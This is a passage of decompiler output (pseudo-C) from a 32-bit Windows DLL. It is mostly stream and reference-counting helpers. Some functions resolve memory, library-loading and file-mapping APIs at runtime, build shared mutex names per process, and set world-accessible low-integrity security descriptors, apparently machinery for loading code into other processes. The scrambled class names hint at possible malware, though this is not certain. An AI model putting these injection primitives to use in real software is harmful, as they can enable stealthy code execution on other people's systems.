  v16[6] = 1;
  if ( !*(_BYTE *)(a1 + 40) )
  {
    sub_1002CC29(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__);
  }
  v14 = sub_10013F56(a1, pExceptionObject);
  if ( !v14 )
  {
    sub_1000E2E3(v16, 1);
    _CxxThrowException(v16, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  (*(void (__thiscall **)(int, int, int, int, _DWORD, int))(*(_DWORD *)(a1 + 4) + 56))(a1 + 4, a2, v14, a12, 0, 60000);
  sub_10029DE8((int)&a4);
  return a2;
}

//----- (10013F56) --------------------------------------------------------
int __userpurge sub_10013F56@<eax>(int a1@<eax>, int pExceptionObject)
{
  if ( !*(_BYTE *)(a1 + 40) )
  {
    sub_1002CC29(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__);
  }
  return (*(int (__thiscall **)(int, _DWORD, int))(*(_DWORD *)(a1 + 4) + 68))(
           a1 + 4,
           *(_DWORD *)(a1 + 36),
           pExceptionObject);
}

//----- (10013F8C) --------------------------------------------------------
_DWORD *__stdcall sub_10013F8C(_DWORD *a1, int a2)
{
  *a1 = off_10073968;
  sub_1001EB43(a1 + 1, 0, 0);
  sub_1000C28D(0, (int)(a1 + 4), 0);
  sub_10013FD9((int)a1, a2);
  return a1;
}
// 10073968: using guessed type int (__thiscall *off_10073968[2])(void *Block, char);

//----- (10013FD9) --------------------------------------------------------
int __userpurge sub_10013FD9@<eax>(int a1@<edi>, int a2)
{
  if ( a1 != a2 )
  {
    *(_BYTE *)(a1 + 40) = *(_BYTE *)(a2 + 40);
    *(_DWORD *)(a1 + 36) = *(_DWORD *)(a2 + 36);
    sub_100126AF();
    sub_1000C439((int *)(a2 + 16), a1 + 16);
  }
  return a1;
}
// 100126AF: using guessed type int sub_100126AF(void);

//----- (1001401E) --------------------------------------------------------
void __cdecl sub_1001401E(int a1, int a2, int a3, int dwProcessId)
{
  unsigned int v4; // esi
  bool v5; // bl
  _DWORD *v6; // eax
  int v7; // ecx
  const wchar_t *v8; // edi
  int v9; // [esp-8h] [ebp-474h] BYREF
  int v10; // [esp-4h] [ebp-470h]
  int v11[5]; // [esp+10h] [ebp-45Ch] BYREF
  HANDLE v12[4]; // [esp+24h] [ebp-448h] BYREF
  _DWORD v13[2]; // [esp+34h] [ebp-438h] BYREF
  int v14[2]; // [esp+3Ch] [ebp-430h] BYREF
  int pExceptionObject; // [esp+44h] [ebp-428h] BYREF
  wchar_t v16[2]; // [esp+48h] [ebp-424h] BYREF
  wchar_t Source[267]; // [esp+252h] [ebp-21Ah] BYREF
  int v18; // [esp+468h] [ebp-4h]

  pExceptionObject = a1;
  v4 = 0;
  v18 = 0;
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
    goto LABEL_2;
  if ( dwProcessId == -1 )
    dwProcessId = (*(int (__thiscall **)(int *))(a2 + 24))(&a2);
  if ( !sub_100145D0(v16, dwProcessId) )
  {
LABEL_2:
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10009D2C(v14, Source);
  LOBYTE(v18) = 1;
  v5 = sub_10013103((int)v14) == 0;
  LOBYTE(v18) = 0;
  sub_10009F65(v14);
  if ( !v5 )
  {
    sub_10009D2C(v14, Source);
    LOBYTE(v18) = 2;
    v6 = sub_10018A88(v13);
    LOBYTE(v18) = 3;
    sub_10012F8B((int)v12, 16, v14, 0, *(LPSECURITY_ATTRIBUTES *)(*v6 + 4));
    LOBYTE(v18) = 5;
    sub_10003D24(v13);
    LOBYTE(v18) = 6;
    sub_10009F65(v14);
    sub_10012C8B((int *)v12, v13);
    LOBYTE(v18) = 7;
    v10 = v7;
    v9 = v7;
    v14[1] = (int)&v9;
    sub_10009D2C(&v9, v16);
    LOBYTE(v18) = 7;
    sub_1002D15F((int)v11, 0x5508u, (LPSECURITY_ATTRIBUTES)1, v9, v10);
    LOBYTE(v18) = 9;
    v8 = (const wchar_t *)(v11[4] + 26);
    while ( _wcsicmp(v8, *(const wchar_t **)(*(_DWORD *)(pExceptionObject + 4) + 12)) )
    {
      ++v4;
      v8 += 272;
      if ( v4 >= 0x28 )
      {
        LOBYTE(v18) = 7;
        sub_1002D2C1(v11);
        LOBYTE(v18) = 6;
        sub_10012CBF(v13);
        LOBYTE(v18) = 0;
        sub_100130B8(v12);
        v18 = -1;
        sub_10009696(&a2);
        goto LABEL_12;
      }
    }
    LOBYTE(v18) = 7;
    sub_1002D2C1(v11);
    LOBYTE(v18) = 6;
    sub_10012CBF(v13);
    LOBYTE(v18) = 0;
    sub_100130B8(v12);
  }
  v18 = -1;
  sub_10009696(&a2);
LABEL_12:
  sub_10056753();
}
// 1001414F: variable 'v7' is possibly undefined
// 1001401E: using guessed type _DWORD var_438[2];
// 1001401E: using guessed type HANDLE var_448[4];

//----- (10014232) --------------------------------------------------------
bool __cdecl sub_10014232(int a1, int a2)
{
  int v2; // eax
  bool v3; // bl
  int v5[10]; // [esp+0h] [ebp-2Ch] BYREF
  int v6; // [esp+28h] [ebp-4h]

  v6 = 0;
  v5[7] = (int)v5;
  sub_100114E7((int)&a2, v5);
  LOBYTE(v6) = 0;
  sub_1001401E(a1, v5[0], v5[1], v5[2]);
  v3 = v2 != 0;
  v6 = -1;
  sub_10009696(&a2);
  return v3;
}
// 10014268: variable 'v2' is possibly undefined

//----- (1001427F) --------------------------------------------------------
int __stdcall sub_1001427F(int a1)
{
  *(_DWORD *)a1 = off_10073968;
  sub_1001EB43((_DWORD *)(a1 + 4), 0, 0);
  sub_1000C28D(0, a1 + 16, 0);
  *(_BYTE *)(a1 + 41) = 0;
  return a1;
}
// 10073968: using guessed type int (__thiscall *off_10073968[2])(void *Block, char);

//----- (100142C7) --------------------------------------------------------
int __cdecl sub_100142C7(int a1, int a2, int a3)
{
  int v3; // eax
  int v5[7]; // [esp+0h] [ebp-30h] BYREF
  int v6; // [esp+1Ch] [ebp-14h]
  int pExceptionObject[3]; // [esp+20h] [ebp-10h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v8 = 0;
  v6 = 0;
  pExceptionObject[0] = (int)v5;
  sub_100114E7(a2, v5);
  v8 = 0;
  sub_1001401E(a3, v5[0], v5[1], v5[2]);
  pExceptionObject[0] = v3;
  if ( !v3 )
  {
    sub_1000DEEF(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1001427F(a1);
  v8 = 0;
  v6 = 1;
  sub_100126AF();
  *(_DWORD *)(a1 + 36) = pExceptionObject[0];
  *(_BYTE *)(a1 + 40) = 1;
  return a1;
}
// 10014302: variable 'v3' is possibly undefined
// 100126AF: using guessed type int sub_100126AF(void);

//----- (10014349) --------------------------------------------------------
char __usercall sub_10014349@<al>(int a1@<eax>, int a2@<ecx>, DWORD dwProcessId)
{
  *(_DWORD *)(a2 + 1144) = a1;
  if ( !sub_10014380((char **)a2) || !sub_100145D0((WCHAR *)(a2 + 96), dwProcessId) )
    return 0;
  *(_BYTE *)(a2 + 1140) = 1;
  return 1;
}

//----- (10014380) --------------------------------------------------------
bool __usercall sub_10014380@<al>(char **a1@<esi>)
{
  char *ModuleHandleW; // edi
  char *v3; // ebx
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char *v27; // eax

  ModuleHandleW = (char *)GetModuleHandleW(aKernel32Dll_2);
  if ( !ModuleHandleW )
    return 0;
  v3 = (char *)GetModuleHandleW(aNtdllDll_0);
  v4 = sub_100266E9(ModuleHandleW, aVirtualalloc);
  a1[1] = v4;
  if ( !v4 )
    return 0;
  v5 = sub_100266E9(ModuleHandleW, aSleep);
  a1[22] = v5;
  if ( !v5 )
    return 0;
  v6 = sub_100266E9(ModuleHandleW, aVirtualfree_0);
  a1[2] = v6;
  if ( !v6 )
    return 0;
  v7 = sub_100266E9(ModuleHandleW, aVirtualprotect);
  a1[3] = v7;
  if ( !v7 )
    return 0;
  v8 = sub_100266E9(ModuleHandleW, aLoadlibrarya);
  a1[4] = v8;
  if ( !v8 )
    return 0;
  v9 = sub_100266E9(ModuleHandleW, aGetprocaddress);
  a1[7] = v9;
  if ( !v9 )
    return 0;
  v10 = sub_100266E9(ModuleHandleW, aGetmodulehandl);
  a1[6] = v10;
  if ( !v10 )
    return 0;
  v11 = sub_100266E9(v3, aMemcpy);
  a1[8] = v11;
  if ( !v11 )
    return 0;
  v12 = sub_100266E9(v3, aMemset);
  a1[9] = v12;
  if ( !v12 )
    return 0;
  v13 = sub_100266E9(ModuleHandleW, aFreelibrary);
  a1[21] = v13;
  if ( !v13 )
    return 0;
  v14 = sub_100266E9(ModuleHandleW, aOpenmutexw);
  *a1 = v14;
  if ( !v14 )
    return 0;
  v15 = sub_100266E9(ModuleHandleW, aCreatefilemapp);
  a1[10] = v15;
  if ( !v15 )
    return 0;
  v16 = sub_100266E9(ModuleHandleW, aMapviewoffile);
  a1[12] = v16;
  if ( !v16 )
    return 0;
  v17 = sub_100266E9(ModuleHandleW, aUnmapviewoffil_0);
  a1[13] = v17;
  if ( !v17 )
    return 0;
  v18 = sub_100266E9(ModuleHandleW, aCreatemutexw);
  a1[17] = v18;
  if ( !v18 )
    return 0;
  v19 = sub_100266E9(ModuleHandleW, aWaitforsingleo);
  a1[18] = v19;
  if ( !v19 )
    return 0;
  v20 = sub_100266E9(ModuleHandleW, aClosehandle);
  a1[19] = v20;
  if ( !v20 )
    return 0;
  v21 = sub_100266E9(v3, aNtqueryinforma);
  a1[15] = v21;
  if ( !v21 )
    return 0;
  v22 = sub_100266E9(ModuleHandleW, aGetlasterror);
  a1[16] = v22;
  if ( !v22 )
    return 0;
  v23 = sub_100266E9(ModuleHandleW, aReleasemutex);
  a1[14] = v23;
  if ( !v23 )
    return 0;
  v24 = sub_100266E9(ModuleHandleW, aOpenfilemappin);
  a1[11] = v24;
  if ( !v24 )
    return 0;
  v25 = sub_100266E9(ModuleHandleW, aLoadlibraryw);
  a1[5] = v25;
  if ( !v25 )
    return 0;
  v26 = sub_100266E9(ModuleHandleW, aCreatefilew);
  a1[20] = v26;
  if ( !v26 )
    return 0;
  v27 = sub_100266E9(ModuleHandleW, aLocalfree);
  a1[23] = v27;
  return v27 != 0;
}

//----- (100145D0) --------------------------------------------------------
bool __cdecl sub_100145D0(WCHAR *a1, DWORD dwProcessId)
{
  DWORD CurrentProcessId; // eax
  HANDLE FileMappingW; // eax
  DWORD v5; // [esp+10h] [ebp-428h] BYREF
  int Version; // [esp+14h] [ebp-424h]
  DWORD pSessionId; // [esp+18h] [ebp-420h] BYREF
  WCHAR pszDest[262]; // [esp+1Ch] [ebp-41Ch] BYREF
  WCHAR String1[262]; // [esp+228h] [ebp-210h] BYREF

  pSessionId = 0;
  memset(String1, 0, 522);
  Version = GetVersion();
  if ( !ProcessIdToSessionId(dwProcessId, &pSessionId) )
    return 0;
  if ( Version < 0 )
    return 0;
  if ( (unsigned __int8)Version < 5u )
    return 0;
  CurrentProcessId = GetCurrentProcessId();
  if ( !ProcessIdToSessionId(CurrentProcessId, &v5) )
    return 0;
  memset(pszDest, 0, 522);
  if ( wnsprintfW(pszDest, 522, pszFmt, v5) < 0 )
    return 0;
  FileMappingW = CreateFileMappingW((HANDLE)0xFFFFFFFF, 0, 4u, 0, 1u, pszDest);
  if ( FileMappingW )
  {
    CloseHandle(FileMappingW);
    if ( wnsprintfW(String1, 522, aSessionD, pSessionId) < 0 )
      return 0;
  }
  else if ( GetLastError() != 3 || !lstrcpynW(String1, String2, 522) )
  {
    return 0;
  }
  if ( wnsprintfW(a1, 522, aSThPoolShdMtxF, String1, dwProcessId) < 0 )
    return 0;
  return wnsprintfW(a1 + 261, 522, aSThPoolShdPqoi, String1, dwProcessId) >= 0;
}

//----- (1001475D) --------------------------------------------------------
char __usercall sub_1001475D@<al>(int a1@<eax>, int a2@<ecx>, DWORD dwProcessId)
{
  LPWSTR v5; // eax
  WCHAR *v6; // edi
  UINT SystemDirectoryW; // eax
  signed int Version; // [esp+8h] [ebp-8h]

  *(_DWORD *)(a2 + 2320) = 0;
  *(_DWORD *)(a2 + 2332) = a1;
  Version = GetVersion();
  if ( !sub_10014380((char **)a2) || !sub_100145D0((WCHAR *)(a2 + 96), dwProcessId) )
    return 0;
  if ( !lstrcpynW((LPWSTR)(a2 + 1274), aMsvcrtDll, 261) )
    return 0;
  if ( !lstrcpynA((LPSTR)(a2 + 1140), aAdvapi32Dll_0, 13) || !lstrcpynA((LPSTR)(a2 + 1153), aConvertstrings_1, 53) )
    return 0;
  v5 = (unsigned __int8)Version == 6
     ? lstrcpynW((LPWSTR)(a2 + 1206), L"S:(ML;;NW;;;LW)D:(A;OICI;GA;;;WD)", 34)
     : lstrcpynW((LPWSTR)(a2 + 1206), L"D:(A;OICI;GA;;;WD)", 34);
  if ( !v5 || Version < 0 || (unsigned __int8)Version < 5u )
    return 0;
  if ( (unsigned __int8)Version != 5 || BYTE1(Version) )
  {
    v6 = (WCHAR *)(a2 + 2338);
    *(_BYTE *)(a2 + 2336) = 1;
    SystemDirectoryW = GetSystemDirectoryW((LPWSTR)(a2 + 2338), 0x104u);
    if ( SystemDirectoryW )
    {
      if ( *(_WORD *)(a2 + 2 * SystemDirectoryW + 2336) != 92 )
        lstrcatW(v6, asc_1008F46C);
      lstrcatW(v6, aShell32Dll);
      return 1;
    }
    return 0;
  }
  *(_BYTE *)(a2 + 2336) = 0;
  return 1;
}
// 10072B6C: using guessed type wchar_t aDAOiciGaWd[19];

//----- (100149AD) --------------------------------------------------------
_DWORD *__usercall sub_100149AD@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (100149E8) --------------------------------------------------------
void __thiscall sub_100149E8(void *this)
{
  sub_10014B02((int)this);
}

//----- (10014A13) --------------------------------------------------------
void __usercall sub_10014A13(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10014B02((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10014A59) --------------------------------------------------------
_DWORD *__usercall sub_10014A59@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (10014A94) --------------------------------------------------------
void __thiscall sub_10014A94(void *this)
{
  sub_10014B2A((int)this);
}

//----- (10014ABF) --------------------------------------------------------
void __usercall sub_10014ABF(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10014B2A((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10014B02) --------------------------------------------------------
void __usercall sub_10014B02(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10014B2A) --------------------------------------------------------
void __usercall sub_10014B2A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10014B52) --------------------------------------------------------
int __stdcall sub_10014B52(int a1, void *a2, char a3)
{
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-20h]

  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_1007397C;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10025D50(a1 + 12, a2, a3, 0, v3, CurrentProcessId);
  return a1;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007397C: using guessed type int (__thiscall *off_1007397C[2])(void *Block, char);

//----- (10014BA3) --------------------------------------------------------
_DWORD *__thiscall sub_10014BA3(_DWORD *Block, char a2)
{
  sub_10014C16(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014BC2) --------------------------------------------------------
int __stdcall sub_10014BC2(int a1, int a2)
{
  void *v2; // ebx
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-20h]

  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_1007397C;
  v2 = *(void **)(a2 + 16);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10025D50(a1 + 12, v2, 0, 0, v3, CurrentProcessId);
  return a1;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007397C: using guessed type int (__thiscall *off_1007397C[2])(void *Block, char);

//----- (10014C16) --------------------------------------------------------
bool __thiscall sub_10014C16(_DWORD *this)
{
  bool result; // al

  *this = off_1007397C;
  result = sub_1000F1E1(this + 3);
  *this = &off_1007332C;
  return result;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007397C: using guessed type int (__thiscall *off_1007397C[2])(void *Block, char);

//----- (10014C49) --------------------------------------------------------
_DWORD *__stdcall sub_10014C49(_DWORD *a1, void *a2, char a3)
{
  void *v3; // eax
  int v4; // eax

  *a1 = &off_100735D8;
  v3 = operator new(0x14u);
  if ( v3 )
    v4 = sub_10014B52((int)v3, a2, a3);
  else
    v4 = 0;
  a1[1] = v4;
  sub_1000F6F0(a1 + 1);
  return a1;
}
// 100735D8: using guessed type int (__thiscall *off_100735D8)(void *Block, char);

//----- (10014C9D) --------------------------------------------------------
void __thiscall sub_10014C9D(int *this)
{
  *this = (int)&off_100735D8;
  sub_1000F6BC(this + 1);
}
// 100735D8: using guessed type int (__thiscall *off_100735D8)(void *Block, char);

//----- (10014CC5) --------------------------------------------------------
void __stdcall sub_10014CC5(int a1, int a2, char pExceptionObject)
{
  _DWORD v3[197]; // [esp+10h] [ebp-32Ch] BYREF
  int v4[5]; // [esp+324h] [ebp-18h] BYREF
  int v5; // [esp+338h] [ebp-4h]

  sub_1002C64A(v3);
  v5 = 0;
  sub_1002C762(a1, (int)v3);
  sub_1002CA17(v3, v4, a2, pExceptionObject);
  LOBYTE(v5) = 0;
  sub_10014C9D(v4);
  v5 = -1;
  sub_1002C6D4(v3);
}
// 10014CC5: using guessed type _DWORD var_32C[197];

//----- (10014D29) --------------------------------------------------------
BOOL __thiscall sub_10014D29(_DWORD *this)
{
  return sub_1000F24B(this[1] + 12);
}

//----- (10014D34) --------------------------------------------------------
void __thiscall sub_10014D34(_DWORD *this, void *a2, int a3)
{
  int v3; // esi
  void *v4; // eax
  int v5; // eax
  DWORD v6; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-24h]

  v3 = this[1];
  if ( *(_DWORD *)(v3 + 4) <= 1u )
  {
    CurrentProcessId = GetCurrentProcessId();
    v6 = GetCurrentProcessId();
    sub_10014EC9((HANDLE *)(v3 + 12), a2, a3, 0, v6, CurrentProcessId);
  }
  else
  {
    v4 = operator new(0x14u);
    if ( v4 )
      v5 = sub_10014B52((int)v4, a2, a3);
    else
      v5 = 0;
    a3 = v5;
    sub_1000F6F0(&a3);
    sub_1001287F();
    sub_1000F6BC(&a3);
  }
}
// 1001287F: using guessed type int sub_1001287F(void);

//----- (10014DBF) --------------------------------------------------------
int __thiscall sub_10014DBF(_DWORD *this)
{
  int v1; // eax
  void *v2; // eax
  void *v3; // eax
  int v5; // [esp+10h] [ebp-14h]
  void *Block[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v1 = this[1];
  v5 = *(_DWORD *)(v1 + 16);
  if ( *(_DWORD *)(v1 + 4) <= 1u )
  {
    *(_DWORD *)(this[1] + 16) = -1;
  }
  else
  {
    v2 = operator new(0x14u);
    Block[0] = v2;
    v7 = 0;
    if ( v2 )
      v3 = (void *)sub_10014B52((int)v2, (void *)0xFFFFFFFF, 0);
    else
      v3 = 0;
    v7 = -1;
    Block[0] = v3;
    sub_1000F6F0((int *)Block);
    v7 = 1;
    sub_1001287F();
    v7 = -1;
    sub_1000F6BC((int *)Block);
  }
  return v5;
}
// 1001287F: using guessed type int sub_1001287F(void);

//----- (10014E39) --------------------------------------------------------
bool __stdcall sub_10014E39(int a1)
{
  _DWORD v2[195]; // [esp+10h] [ebp-320h] BYREF
  int v3[4]; // [esp+31Ch] [ebp-14h] BYREF
  int v4; // [esp+32Ch] [ebp-4h]
  bool v5; // [esp+33Bh] [ebp+Bh]

  sub_1002C64A(v2);
  v4 = 0;
  sub_1002C762(a1, (int)v2);
  sub_1002C8C7((int)v2, v3, 0, 0);
  LOBYTE(v4) = 1;
  v5 = *(_DWORD *)(v3[1] + 16) != -1;
  LOBYTE(v4) = 0;
  sub_10014C9D(v3);
  v4 = -1;
  sub_1002C6D4(v2);
  return v5;
}
// 10014E39: using guessed type _DWORD var_320[195];

//----- (10014EB1) --------------------------------------------------------
bool __usercall sub_10014EB1@<al>(int a1@<eax>, int a2@<ecx>)
{
  return a1 == a2 || *(_DWORD *)(*(_DWORD *)(a2 + 4) + 16) == *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
}

//----- (10014EC9) --------------------------------------------------------
void __thiscall sub_10014EC9(
        HANDLE *this,
        HANDLE hSourceHandle,
        char a3,
        BOOL bInheritHandle,
        DWORD dwProcessId,
        DWORD a6)
{
  void *v7; // eax
  _DWORD pExceptionObject[3]; // [esp+8h] [ebp-Ch] BYREF

  if ( this[1] != hSourceHandle && !sub_1000F231((int)this) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( a3 )
  {
    sub_10025FBF(hSourceHandle, bInheritHandle, dwProcessId);
    this[1] = v7;
  }
  else
  {
    this[1] = hSourceHandle;
  }
}
// 10014F14: variable 'v7' is possibly undefined
// 10014EC9: using guessed type _DWORD pExceptionObject[3];

//----- (10014F3E) --------------------------------------------------------
_DWORD *__thiscall sub_10014F3E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // edx

  sub_10025BDE((int)a2);
  sub_10019FEC((int)(a2 + 2));
  *a2 = &off_10073980;
  *v3 = &off_100739B0;
  sub_1000C3F3(this, (int)(a2 + 4));
  a2[9] = 0;
  a2[10] = this[3];
  return a2;
}
// 10014F70: variable 'v3' is possibly undefined
// 10073980: using guessed type int (__thiscall *off_10073980)(void *Block, char);
// 100739B0: using guessed type int (__stdcall *off_100739B0)(int);

//----- (10014F97) --------------------------------------------------------
void *__thiscall sub_10014F97(void *Block, char a2)
{
  sub_1001500D((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014FB6) --------------------------------------------------------
_DWORD *__stdcall sub_10014FB6(_DWORD *a1)
{
  _DWORD *v1; // edx

  sub_10025BDE((int)a1);
  sub_10019FEC((int)(a1 + 2));
  *a1 = &off_10073980;
  *v1 = &off_100739B0;
  sub_1000C28D(0, (int)(a1 + 4), 0);
  a1[9] = 0;
  a1[10] = 0;
  return a1;
}
// 10014FEA: variable 'v1' is possibly undefined
// 10073980: using guessed type int (__thiscall *off_10073980)(void *Block, char);
// 100739B0: using guessed type int (__stdcall *off_100739B0)(int);

//----- (1001500D) --------------------------------------------------------
void __thiscall sub_1001500D(int this)
{
  _BYTE *v2; // ecx

  *(_DWORD *)this = &off_10073980;
  v2 = (_BYTE *)(this + 8);
  *(_DWORD *)v2 = &off_100739B0;
  *(_BYTE *)(this + 4) = 1;
  sub_1001A081(v2);
  sub_1000C45D((int *)(this + 16));
  sub_1001A03A(this != 0 ? (_BYTE *)(this + 8) : 0);
  sub_10025C2C((_BYTE *)this);
}
// 10073980: using guessed type int (__thiscall *off_10073980)(void *Block, char);
// 100739B0: using guessed type int (__stdcall *off_100739B0)(int);

//----- (10015086) --------------------------------------------------------
int __thiscall sub_10015086(int *this, _BYTE *a2)
{
  if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 28))(this) )
    return 0;
  *a2 = *(_BYTE *)sub_1000C55B((int)(this + 4), this[9]++);
  return 1;
}

//----- (100150B6) --------------------------------------------------------
size_t __thiscall sub_100150B6(_DWORD *this, _DWORD *a2)
{
  unsigned int v5; // ebx
  size_t v6; // ebx
  void *v7; // eax
  const void *v8; // [esp-10h] [ebp-14h]
  char v9; // [esp+Fh] [ebp+Bh]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  v5 = a2[3];
  if ( v5 >= (*(int (__thiscall **)(_DWORD *))(*this + 24))(this) )
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 24))(this);
  else
    v6 = a2[3];
  v9 = *(_BYTE *)(a2[1] + 8);
  v8 = (const void *)(this[9] + sub_1000C52E(this + 4));
  v7 = (void *)sub_1000C50A(a2);
  memcpy(v7, v8, v6);
  if ( v9 )
    *(_BYTE *)(a2[1] + 8) = 1;
  this[9] += v6;
  return v6;
}

//----- (10015129) --------------------------------------------------------
unsigned int __thiscall sub_10015129(int *this, char a2)
{
  unsigned int v3; // eax
  unsigned int result; // eax

  v3 = this[7];
  if ( v3 >= this[8] )
    sub_10015252(this - 2, (void *)(v3 + 1));
  *(_BYTE *)sub_1000C55B((int)(this + 2), this[7]) = a2;
  result = ++this[7];
  if ( result > this[8] )
    this[8] = result;
  return result;
}

//----- (10015164) --------------------------------------------------------
int __thiscall sub_10015164(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edi
  int v4; // eax
  int result; // eax
  bool v6; // cc
  const void *v7; // [esp-8h] [ebp-14h]
  size_t v8; // [esp-4h] [ebp-10h]

  v3 = this[7] + a2[3];
  if ( v3 > this[8] )
    sub_10015252(this - 2, (void *)(this[7] + a2[3]));
  v8 = a2[3];
  v7 = (const void *)sub_1000C52E(a2);
  v4 = sub_1000C50A(this + 2);
  memcpy((void *)(this[7] + v4), v7, v8);
  result = this[3];
  *(_BYTE *)(result + 8) = 1;
  v6 = v3 <= this[8];
  this[7] = v3;
  if ( !v6 )
    this[8] = v3;
  return result;
}

//----- (100151BB) --------------------------------------------------------
int __thiscall sub_100151BB(int *this, int a2)
{
  sub_1000C709(this[10], this + 4, a2, 0);
  return a2;
}

//----- (100151F1) --------------------------------------------------------
int __thiscall sub_100151F1(_DWORD *this)
{
  return this[10] - this[9];
}

//----- (100151F8) --------------------------------------------------------
BOOL __thiscall sub_100151F8(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (10015203) --------------------------------------------------------
int __thiscall sub_10015203(_DWORD *this)
{
  return this[9];
}

//----- (10015207) --------------------------------------------------------
int __thiscall sub_10015207(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[9];
    }
    else if ( a3 == 2 )
    {
      v3 = this[10];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[10] )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[9] = result;
  return result;
}
// 10015207: using guessed type _DWORD pExceptionObject[2];

//----- (10015252) --------------------------------------------------------
unsigned int __thiscall sub_10015252(_DWORD *this, void *a2)
{
  unsigned int result; // eax
  int *v4; // eax
  unsigned int i; // ebx
  _DWORD *v6; // eax
  int v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  result = this[7];
  if ( !result )
  {
    v4 = (int *)sub_1000C28D(a2, (int)v7, 0);
    v8 = 0;
    sub_1000C439(v4, (int)(this + 4));
LABEL_8:
    v8 = -1;
    return sub_1000C45D(v7);
  }
  for ( i = this[7]; (unsigned int)a2 > i; i *= 2 )
    ;
  if ( i > result )
  {
    v6 = (_DWORD *)sub_1000C28D((void *)(i - result), (int)v7, 0);
    v8 = 1;
    sub_1000C5DF(v6, (int)(this + 4));
    goto LABEL_8;
  }
  return result;
}
// 10015252: using guessed type int var_20[7];

//----- (100152D6) --------------------------------------------------------
char sub_100152D6()
{
  return 1;
}

//----- (100152D9) --------------------------------------------------------
int __thiscall sub_100152D9(_DWORD *this)
{
